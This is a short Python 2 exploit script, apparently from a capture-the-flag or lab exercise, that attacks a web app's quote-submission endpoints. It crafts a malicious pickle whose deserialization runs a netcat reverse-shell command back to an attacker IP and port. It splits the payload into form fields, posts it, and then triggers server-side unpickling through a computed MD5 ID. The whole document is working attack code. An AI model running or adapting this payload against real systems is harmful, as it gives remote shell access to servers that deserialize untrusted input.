import cPickle, requests, os
from hashlib import md5

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("homer!rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.187 1234 >/tmp/f",))

payload = cPickle.dumps(Exploit())
character, quote = payload.split('!')

p_id = md5(character + quote).hexdigest()
print("[+] ID:", p_id)

requests.post("http://10.129.25.27/submit", data={
    "character": character,
    "quote": quote
})

print("[+] Submitted. Now start your listener and press Enter...")
raw_input()

requests.post("http://10.129.25.27/check", data={"id": p_id})
print("[+] Triggered")
